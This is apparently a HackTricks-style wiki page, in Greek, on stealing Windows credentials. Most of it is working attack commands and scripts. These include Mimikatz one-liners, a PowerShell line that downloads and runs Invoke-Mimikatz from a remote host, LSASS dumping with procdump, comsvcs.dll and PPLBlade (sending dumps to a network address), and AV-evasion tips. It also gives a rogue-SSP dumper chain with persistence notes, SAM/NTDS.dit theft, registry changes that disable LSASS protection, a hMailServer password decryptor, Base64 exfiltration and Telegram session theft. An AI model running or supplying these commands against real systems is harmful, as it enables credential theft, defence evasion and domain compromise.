# Κλοπή διαπιστευτηρίων Windows

{{#include ../../banners/hacktricks-training.md}}

## Διαπιστευτήρια Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**αυτήν τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για ορισμένες πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να εμποδίσουν το Mimikatz να εξαγάγει ορισμένα διαπιστευτήρια.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για την **αναζήτηση κωδικών πρόσβασης και hashes** μέσα στο σύστημα του θύματος.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς το **Procdump από το** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **είναι ένα νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διεργασία lsass**, να **κατεβάσετε το dump** και να **εξαγάγετε** τα **διαπιστευτήρια τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Αυτή η διαδικασία εκτελείται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Ορισμένα **AV** ενδέχεται να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για dump του lsass.exe**, επειδή **ανιχνεύουν** τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο **stealthier** να **περαστεί** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dumping lsass με **comsvcs.dll**

Ένα DLL με το όνομα **comsvcs.dll**, το οποίο βρίσκεται στο `C:\Windows\System32`, είναι υπεύθυνο για το **dump της μνήμης διεργασιών** σε περίπτωση crash. Αυτό το DLL περιλαμβάνει μια **function** με το όνομα **`MiniDumpW`**, η οποία έχει σχεδιαστεί για να καλείται μέσω του `rundll32.exe`.\
Δεν έχει σημασία η χρήση των δύο πρώτων ορισμάτων, αλλά το τρίτο χωρίζεται σε τρία στοιχεία. Το process ID που θα γίνει dump αποτελεί το πρώτο στοιχείο, η τοποθεσία του dump file αποτελεί το δεύτερο και το τρίτο στοιχείο είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Μετά την ανάλυση αυτών των τριών στοιχείων, το DLL δημιουργεί το dump file και μεταφέρει τη μνήμη της καθορισμένης διεργασίας σε αυτό το αρχείο.\
Η χρήση του **comsvcs.dll** είναι εφικτή για το dump της διεργασίας lsass, εξαλείφοντας έτσι την ανάγκη για upload και εκτέλεση του procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτήν τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo)**.**

### **Dumping lsass με το Task Manager**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και κάντε κλικ στο Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διεργασία "Local Security Authority Process" και κάντε κλικ στο "Create dump file".

### Dumping lsass με το procdump

Το [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα binary υπογεγραμμένο από τη Microsoft, το οποίο αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο Protected Process Dumper που υποστηρίζει την obfuscation του memory dump και τη μεταφορά του σε απομακρυσμένους σταθμούς εργασίας χωρίς την εγγραφή του στον δίσκο.

**Βασικές λειτουργίες**:

1. Bypassing της προστασίας PPL
2. Obfuscating αρχείων memory dump για την αποφυγή των signature-based μηχανισμών εντοπισμού του Defender
3. Uploading memory dump με τις μεθόδους RAW και SMB upload χωρίς την εγγραφή του στον δίσκο (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – LSASS dumping βασισμένο σε SSP χωρίς MiniDumpWriteDump

Το Ink Dragon περιλαμβάνει έναν dumper τριών σταδίων με την ονομασία **LalsDumper**, ο οποίος δεν καλεί ποτέ το `MiniDumpWriteDump`, επομένως τα EDR hooks σε αυτό το API δεν ενεργοποιούνται:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – αναζητά στο `fdp.dll` ένα placeholder που αποτελείται από 32 πεζούς χαρακτήρες `d`, το αντικαθιστά με το απόλυτο path προς το `rtu.txt`, αποθηκεύει το τροποποιημένο DLL ως `nfdp.dll` και καλεί `AddSecurityPackageA("nfdp","fdp")`. Αυτό αναγκάζει το **LSASS** να φορτώσει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 μέσα στο LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, εφαρμόζει XOR σε κάθε byte με `0x20` και κάνει map το decoded blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το mapped payload επανυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που εντοπίζονται από hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα ειδικό export με όνομα `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, γράφει ένα compressed LSASS dump στο αρχείο και κλείνει το handle, ώστε το exfiltration να γίνει αργότερα.

Σημειώσεις operator:

* Διατηρήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο κατάλογο. Το Stage 1 αντικαθιστά το hard-coded placeholder με το απόλυτο path προς το `rtu.txt`, επομένως ο διαχωρισμός τους διακόπτει την αλυσίδα.
* Η εγγραφή γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να προετοιμάσετε μόνοι σας αυτή την τιμή, ώστε το LSASS να επαναφορτώνει το SSP σε κάθε boot.
* Τα αρχεία `%TEMP%\*.ddt` είναι compressed dumps. Κάντε decompress τοπικά και, στη συνέχεια, δώστε τα σε Mimikatz/Volatility για credential extraction.
* Η εκτέλεση του `lals.exe` απαιτεί δικαιώματα admin/SeTcb, ώστε να επιτύχει το `AddSecurityPackageA`. Μόλις επιστρέψει η κλήση, το LSASS φορτώνει transparently το rogue SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από τον δίσκο δεν το απομακρύνει από το LSASS. Διαγράψτε την registry entry και κάντε restart το LSASS (reboot) ή αφήστε την για persistence μακράς διάρκειας.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump του NTDS.dit από τον target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump του password history του NTDS.dit από το target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση του attribute pwdLastSet για κάθε NTDS.dit account
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Κλοπή SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στα _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Ωστόσο, **δεν μπορείτε απλώς να τα αντιγράψετε με τον κανονικό τρόπο**, επειδή είναι προστατευμένα.

### Από το Registry

Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να λάβετε ένα αντίγραφο από το Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στο Kali machine σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Χρειάζεστε δικαιώματα Administrator.

#### Using vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα για το **πώς να αντιγράψετε το αρχείο SAM** (η μονάδα δίσκου που χρησιμοποιείται είναι η "C:" και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Τέλος, θα μπορούσατε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, καθώς περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και τις membership τους. Εκεί αποθηκεύονται τα **password hashes** των χρηστών του domain. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Αυτός ο πίνακας είναι υπεύθυνος για την αποθήκευση λεπτομερειών σχετικά με αντικείμενα, όπως χρήστες και ομάδες.
- **Link Table**: Παρακολουθεί τις σχέσεις, όπως τις group memberships.
- **SD Table**: Εδώ αποθηκεύονται τα **security descriptors** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

Η έρευνα του Christoffer Andersson σχετικά με το database layer τεκμηριώνει λεπτομερέστερα αυτούς τους πίνακες και τη συμπεριφορά τους ανά έκδοση.<sup>[[8]](#references)</sup>

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο και αυτό χρησιμοποιείται από το _lsass.exe_. Επομένως, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται στη μνήμη του **`lsass`** (πιθανότατα μπορείτε να βρείτε τα δεδομένα στα οποία έγινε πιο πρόσφατη πρόσβαση, λόγω της βελτίωσης της απόδοσης μέσω της χρήσης **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash είναι κρυπτογραφημένο τρεις φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή σε κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο **NTDS.dit** με το ειδικό για το DC **BOOTKEY** από το **SYSTEM** hive του συγκεκριμένου domain controller. Επομένως, η εξαγωγή credentials απαιτεί τόσο το **NTDS.dit** όσο και το **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Αντιγραφή του NTDS.dit με χρήση του Ntdsutil

Διαθέσιμο από τον Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**volume shadow copy**](#stealing-sam-and-system) trick για να αντιγράψετε το αρχείο **ntds.dit**. Να θυμάστε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (και πάλι, χρησιμοποιήστε το trick [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **τα εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα αρχεία NTDS.dit**, συνιστάται η εξαγωγή τους με το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο secrets, αλλά και ολόκληρα τα αντικείμενα μαζί με τα attributes τους, για περαιτέρω εξαγωγή πληροφοριών, όταν το raw αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση secrets (NT & LM hashes, supplemental credentials όπως cleartext passwords, κλειδιά kerberos ή trust, καθώς και ιστορικό NT & LM passwords). Μαζί με άλλες πληροφορίες, εξάγονται τα ακόλουθα δεδομένα: λογαριασμοί χρηστών και μηχανημάτων με τα hashes τους, UAC flags, timestamp τελευταίου logon και αλλαγής password, περιγραφές λογαριασμών, ονόματα, UPN, SPN, groups και recursive memberships, δέντρο organizational units και membership, trusted domains με τον τύπο, την κατεύθυνση και τα attributes των trusts...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για την εξαγωγή credentials από διάφορα software.
```
lazagne.exe all
```
## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή credentials από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το**· οι κωδικοί πρόσβασης θα εξαχθούν.

## Συλλογή idle RDP sessions και αποδυνάμωση των security controls

Το FinalDraft RAT της Ink Dragon περιλαμβάνει ένα `DumpRDPHistory` tasker, του οποίου οι τεχνικές είναι χρήσιμες για κάθε red-teamer:<sup>[[3]](#references)</sup>

### Συλλογή telemetry τύπου DumpRDPHistory

* **Outbound RDP targets** – αναλύστε κάθε user hive στη διαδρομή `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε subkey αποθηκεύει το όνομα του server, το `UsernameHint` και το timestamp της τελευταίας εγγραφής. Μπορείτε να αναπαραγάγετε τη λογική του FinalDraft με PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – αναζητήστε στο log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` τα Event IDs **21** (επιτυχές logon) και **25** (disconnect), για να χαρτογραφήσετε ποιος έκανε administration στο σύστημα:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Μόλις γνωρίζετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) όσο το **disconnected** session του εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει το verifier και τα tokens του στο LSASS, τα οποία μπορούν στη συνέχεια να γίνουν replay μέσω SMB/WinRM για να αποκτήσετε το `NTDS.dit` ή να εγκαταστήσετε persistence σε domain controllers.

### Registry downgrades που στοχεύει το FinalDraft

Το ίδιο implant τροποποιεί επίσης αρκετά registry keys, ώστε να διευκολύνει το credential theft:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Η ρύθμιση `DisableRestrictedAdmin=1` επιβάλλει πλήρη επαναχρησιμοποίηση credentials/ticket κατά τη διάρκεια του RDP, επιτρέποντας pivots τύπου pass-the-hash.
* Η ρύθμιση `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το φιλτράρισμα token του UAC, ώστε οι local admins να λαμβάνουν unrestricted tokens μέσω του δικτύου.
* Η ρύθμιση `DSRMAdminLogonBehavior=2` επιτρέπει στον DSRM administrator να κάνει log on ενώ ο DC είναι online, παρέχοντας στους attackers έναν ακόμη ενσωματωμένο λογαριασμό με υψηλά privileges.
* Η ρύθμιση `RunAsPPL=0` καταργεί τις προστασίες LSASS PPL, καθιστώντας την πρόσβαση στη μνήμη εύκολη για dumpers όπως το LalsDumper.

## hMailServer database credentials (post-compromise)

Το hMailServer αποθηκεύει το DB password του στο `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, κάτω από το `[Database] Password=`. Η τιμή είναι κρυπτογραφημένη με Blowfish, χρησιμοποιώντας το static key `THIS_KEY_IS_NOT_SECRET` και swaps endianness σε λέξεις 4 byte. Χρησιμοποιήστε το hex string από το INI με αυτό το Python snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Με τον κωδικό πρόσβασης σε clear-text, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε τα file locks, φορτώστε τον 32-bit provider και κάντε upgrade αν χρειάζεται πριν από την αναζήτηση των hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Η στήλη `accountpassword` χρησιμοποιεί το hash format του hMailServer (hashcat mode `1421`). Το cracking αυτών των τιμών μπορεί να παρέχει επαναχρησιμοποιήσιμα credentials για WinRM/SSH pivots.

## Παρεμβολή LSA Logon Callback (LsaApLogonUserEx2)

Ορισμένα εργαλεία καταγράφουν **plaintext logon passwords** παρεμβαίνοντας στο LSA logon callback `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrap στο authentication package callback, ώστε τα credentials να καταγράφονται **κατά το logon** (πριν από το hashing) και στη συνέχεια να γράφονται στον δίσκο ή να επιστρέφονται στον operator. Αυτό υλοποιείται συνήθως ως helper που injects στο LSA ή κάνει register με αυτό και καταγράφει κάθε επιτυχημένο interactive/network logon event μαζί με το username, το domain και το password.<sup>[[1]](#references)</sup>

Operational notes:
- Απαιτούνται local admin/SYSTEM δικαιώματα για τη φόρτωση του helper στο authentication path.
- Τα captured credentials εμφανίζονται μόνο όταν πραγματοποιείται logon (interactive, RDP, service ή network logon, ανάλογα με το hook).

## Αποθηκευμένα SSMS Connection Credentials (sqlstudio.bin)

Το SQL Server Management Studio (SSMS) αποθηκεύει τις πληροφορίες των saved connections σε ένα per-user αρχείο `sqlstudio.bin`. Dedicated dumpers μπορούν να κάνουν parse στο αρχείο και να ανακτήσουν saved SQL credentials. Σε shells που επιστρέφουν μόνο command output, το αρχείο συχνά γίνεται exfiltrate με encoding σε Base64 και εκτύπωσή του στο stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Στην πλευρά του operator, ανακατασκευάστε το αρχείο και εκτελέστε το dumper τοπικά για να ανακτήσετε διαπιστευτήρια:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Κλοπή session `tdata` του Telegram Desktop

Το Telegram Desktop διατηρεί τα δεδομένα authorization και την κατάσταση του account στον κατάλογο **`tdata`**. Ένα αντιγραμμένο session μπορεί να φορτωθεί από συμβατό tooling για authentication χωρίς τον κωδικό πρόσβασης του account, όσο το συγκεκριμένο authorization παραμένει έγκυρο· αν είναι ενεργοποιημένη η local-data encryption, το stealer χρειάζεται επίσης το passcode. Ένα authenticated session μπορεί στη συνέχεια να αποκαλύψει δεδομένα ταυτότητας, metadata διαλόγων και memberships, μηνύματα και downloadable media.<sup>[[10]](#references)</sup>

### Εντοπισμός και απόκτηση

Αναζητήστε τόσο εγκατεστημένες όσο και portable διατάξεις· τα ονόματα των Microsoft Store packages διαφέρουν, επομένως απαριθμήστε τους καταλόγους packages που περιέχουν `TelegramMessenge` και ελέγξτε το subtree `LocalCache\Roaming` τους.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Εάν οι συνηθισμένες αναγνώσεις αποτυγχάνουν και το token της διεργασίας **περιέχει ήδη και έχει ενεργοποιημένο** το `SeBackupPrivilege`, η πρόσβαση με επίγνωση backup παρέχει εναλλακτική λύση· δεν αποκτά το privilege ούτε κάνει elevate τη διεργασία. Το `CreateFileW` με `FILE_FLAG_BACKUP_SEMANTICS` μπορεί να ζητήσει σημασιολογία backup/restore και να παρακάμψει τους ελέγχους ασφάλειας αρχείων όταν υπάρχουν τα απαιτούμενα token privileges, αλλά η σημαία από μόνη της δεν παρακάμπτει ένα ασύμβατο sharing lock.<sup>[[10]](#references)[[11]](#references)</sup>

Για live locked files, δημιουργήστε ένα **Volume Shadow Copy**· για αρχεία που αποκλείονται από ACL, το `robocopy /B` χρησιμοποιεί backup mode και παρακάμπτει τα ACL αρχείων και καταλόγων.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Ένα implant που λαμβάνει υπόψη το bandwidth μπορεί να υποβάλει αρχικά μόνο το inventory των διαδρομών αρχείων, να λάβει ένα αναγνωριστικό snapshot μαζί με τις διαδρομές που είναι ήδη αποθηκευμένες από το C2 και να κάνει upload μόνο των αρχείων που λείπουν. Επομένως, οι μικρές incremental μεταφορές μετά από recursive enumeration του `tdata` μπορεί και πάλι να υποδεικνύουν επιτυχή κλοπή session.<sup>[[10]](#references)</sup>

### Εντοπισμός και περιορισμός

